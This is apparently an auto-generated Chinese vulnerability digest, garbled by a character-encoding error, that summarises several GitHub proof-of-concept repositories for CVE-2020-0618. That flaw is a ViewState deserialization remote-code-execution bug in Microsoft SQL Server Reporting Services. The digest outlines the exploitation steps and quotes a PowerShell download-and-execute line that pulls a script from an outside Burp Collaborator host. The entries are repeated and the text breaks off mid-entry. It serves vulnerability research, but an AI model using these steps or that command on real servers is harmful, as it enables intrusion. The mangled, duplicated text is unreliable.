**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
